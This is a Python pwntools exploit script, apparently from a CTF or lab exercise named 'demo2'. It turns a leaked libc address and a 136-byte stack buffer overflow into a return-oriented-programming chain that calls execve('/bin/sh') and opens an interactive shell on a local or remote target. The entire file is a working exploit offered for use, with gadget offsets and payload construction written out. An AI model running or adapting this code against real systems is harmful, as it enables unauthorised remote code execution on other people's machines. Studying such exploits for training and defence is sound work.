#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])  
    p = remote(addr,port)
else:
    p = process('./demo2')

libc = ELF("../libc.so.6")

printf_libc = libc.symbols['printf']
log.info("printf@libc: " + hex(printf_libc))

system_libc = libc.symbols['execve']
log.info("execve@libc: " + hex(system_libc))

binsh_libc = libc.search('/bin/sh').next()
log.info("binsh@libc: " + hex(binsh_libc))

buflen = 136
padding = 0xdeadbeef

# some func leak libc
printf = u64(p.recv(8))
log.info("printf= " + hex(printf))
p.recvuntil("input\n")

offset = printf - printf_libc

system = system_libc + offset
log.info("execve= " + hex(system))

# all gadgets in libc
pppr = 0x00102e84 + offset
# 0x00102e84      415d           pop r13
# 0x00102e86      415e           pop r14
# 0x00102e88      415f           pop r15
# 0x00102e8a      c3             ret
log.info("pppr= " + hex(pppr))

mmmc = 0x00000000001396be + offset
# mov rdx, r15; mov rsi, r14; mov rdi, r13; call rax;
log.info("mmmc= " + hex(mmmc))

prax = 0x00000000000439c8 + offset
# pop rax; ret;
log.info("poprax= " + hex(prax))

binsh = binsh_libc + offset
log.info("binsh= " + hex(binsh))

payload = ""
payload += "A" * buflen
payload += p64(pppr)
r13 = binsh            # mov    rdx,r13
r14 = 0                # mov    rsi,r14
r15 = 0                # mov    edi,r15
ret = prax
payload += p64(r13) + p64(r14) + p64(r15) + p64(ret)
rax = system
ret = mmmc
payload += p64(rax) + p64(ret)

# gdb.attach(p)
p.sendline(payload)

p.interactive()
